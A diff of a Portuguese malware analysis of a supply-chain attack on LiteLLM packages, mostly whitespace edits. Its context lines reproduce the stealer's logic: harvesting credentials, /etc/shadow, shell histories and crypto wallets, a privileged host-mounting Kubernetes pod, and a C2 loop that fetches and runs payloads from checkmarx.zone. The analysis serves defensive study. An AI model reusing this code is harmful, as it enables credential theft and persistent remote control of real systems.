@@ -54,7 +54,7 @@ Post do Snyk (o mais técnico/com código que achei).
 
 ## Estágio 1 — Dropper
 
-O ponto de entrada foram duas versões do pacote LiteLLM v1.82.7 e v1.82.8. Ele é o 1o Estágio, vulgo Dropper. Sua única responsabilidade é executar o infostealer, que coleta os dados, sem (muitos) deixar rastros, cifrar o resultado e exfiltrá-lo.
+O ponto de entrada foram duas versões do pacote LiteLLM v1.82.7 e v1.82.8. Ele é o 1o Estágio, vulgo Dropper. Sua única responsabilidade é executar o infostealer, que coleta os dados, sem deixar (muitos) rastros, cifrar o resultado e exfiltrá-lo.
 
 ### Execução em memória
 ```python
@@ -154,7 +154,7 @@ tkn_req = urllib.request.Request('http://169.254.169.254/latest/api/token',
     headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'}, method='PUT')
 imds_token = r.read().decode()
 # ... obtém role_name, depois as credenciais temporárias
-AK = creds.get('AccessKeyId', AK)   # substitui pelas do role se tiver
+AK = creds.get('AccessKeyId', AK)       # substitui pelas do role se tiver
 SK = creds.get('SecretAccessKey', SK)
 ST = creds.get('Token', ST)
 ```
@@ -210,25 +210,25 @@ walk(all_roots, 5, lambda fp,fn: os.path.splitext(fn)[1] in {'.pem','.key','.p12
 for ci in ['.gitlab-ci.yml', '.travis.yml', 'Jenkinsfile', '.drone.yml']: emit(ci)
 
 # Bancos de dados
-emit(h+'/.my.cnf')       # MySQL com senha
-emit(h+'/.pgpass')        # PostgreSQL com senha
+emit(h+'/.my.cnf')                  # MySQL com senha
+emit(h+'/.pgpass')                  # PostgreSQL com senha
 emit('/etc/redis/redis.conf')
 emit('/etc/postfix/sasl_passwd')
 
 # Tokens e credenciais de serviços
-emit(h+'/.npmrc')         # token npm (acesso a pacotes privados)
-emit(h+'/.vault-token')   # HashiCorp Vault
-emit(h+'/.netrc')         # credenciais FTP/HTTP
-emit('/etc/shadow')        # hashes de senha do sistema
+emit(h+'/.npmrc')                   # token npm (acesso a pacotes privados)
+emit(h+'/.vault-token')             # HashiCorp Vault
+emit(h+'/.netrc')                   # credenciais FTP/HTTP
+emit('/etc/shadow')                 # hashes de senha do sistema
 
 # Histórico de shell — comandos com credenciais digitadas
 for hist in ['/.bash_history','/.zsh_history','/.mysql_history','/.psql_history','/.rediscli_history']:
     emit(h+hist)
 
 # Wallets de cripto
-walk([h+'/.ethereum/keystore'], 1, ...)           # Ethereum
+walk([h+'/.ethereum/keystore'], 1, ...)         # Ethereum
 walk([h+'/.bitcoin'], 2, lambda fp,fn: fn.startswith('wallet') and fn.endswith('.dat'))
-walk([h+'/.config/solana'], 3, ...)               # Solana (validator keypairs inclusos)
+walk([h+'/.config/solana'], 3, ...)             # Solana (validator keypairs inclusos)
 walk([h+'/.cardano'], 3, lambda fp,fn: fn.endswith('.skey') or fn.endswith('.vkey'))
 
 # GCP e Azure
@@ -249,14 +249,14 @@ pod_manifest = {
     'metadata': {'name': f'node-setup-{node_name[:35]}', 'namespace': 'kube-system'},
     'spec': {
         'nodeName': node_name,
-        'hostPID': True,                          # acesso a todos os processos do nó
-        'hostNetwork': True,                      # acesso à rede do nó
-        'tolerations': [{'operator': 'Exists'}],  # roda em QUALQUER nó, ignora taints
+        'hostPID': True,                                # acesso a todos os processos do nó
+        'hostNetwork': True,                            # acesso à rede do nó
+        'tolerations': [{'operator': 'Exists'}],        # roda em QUALQUER nó, ignora taints
         'containers': [{
             'securityContext': {'privileged': True},
-            'volumeMounts': [{'mountPath': '/host'}]  # filesystem completo do nó
+            'volumeMounts': [{'mountPath': '/host'}]    # filesystem completo do nó
         }],
-        'volumes': [{'hostPath': {'path': '/'}}],     # monta / do host
+        'volumes': [{'hostPath': {'path': '/'}}],       # monta / do host
     }
 }
 ```
@@ -319,20 +319,20 @@ Três detalhes do disfarce:
 Esse é o `PERSIST_B64` decodado. É o que instala nos nós. Não coleta, não exfiltra. Faz uma coisa: **espera ordens e executa qualquer payload que o atacante publicar**.
 
 ```python
-C_URL  = "https://checkmarx.zone/raw"  # C2 server — imita a empresa Checkmarx
+C_URL  = "https://checkmarx.zone/raw"   # C2 server — imita a empresa Checkmarx
 TARGET = "/tmp/pglog"                   # payload salvo aqui — disfarçado de log PostgreSQL
-STATE  = "/tmp/.pg_state"              # memória entre ciclos — URL do último payload executado
+STATE  = "/tmp/.pg_state"               # memória entre ciclos — URL do último payload executado
 ```
 
 ### Lógica completa
 
 ```python
 if __name__ == "__main__":
-    time.sleep(300)      # dorme 5 minutos — evade sandboxes de análise (costumam rodar <60s)
+    time.sleep(300)         # dorme 5 minutos — evade sandboxes de análise (costumam rodar <60s)
 
     while True:
-        l = g()          # GET https://checkmarx.zone/raw → espera uma URL como resposta
-        prev = ler STATE # URL do último payload executado
+        l = g()             # GET https://checkmarx.zone/raw → espera uma URL como resposta
+        prev = ler STATE    # URL do último payload executado
 
         if l and l != prev and "youtube.com" not in l:
             # três condições:
@@ -341,17 +341,17 @@ if __name__ == "__main__":
             # 3. não é redirect de sinkhole (takedowns redirecionam para youtube.com)
             e(l)
 
-        time.sleep(3000)  # polling a cada 50 minutos — frequência baixa, difícil de detectar
+        time.sleep(3000)    # polling a cada 50 minutos — frequência baixa, difícil de detectar
 ```
 
 ```python
 def e(l):
     urllib.request.urlretrieve(l, TARGET)   # baixa o binário/script do atacante
-    os.chmod(TARGET, 0o755)                  # torna executável
+    os.chmod(TARGET, 0o755)                 # torna executável
     subprocess.Popen([TARGET],
         stdout=subprocess.DEVNULL,
         stderr=subprocess.DEVNULL,
-        start_new_session=True)              # executa DETACHED — sobrevive se o pai morrer
+        start_new_session=True)             # executa DETACHED — sobrevive se o pai morrer
     with open(STATE, "w") as f: f.write(l)  # salva URL para comparação futura
 ```
 O `start_new_session=True` é crítico: mesmo que o `sysmon.service` seja parado, o payload já em execução **continua rodando**. Uma atualização no C2 propaga para todas as máquinas infectadas em até 50 minutos — cluster inteiro, múltiplos nós, máquinas locais.
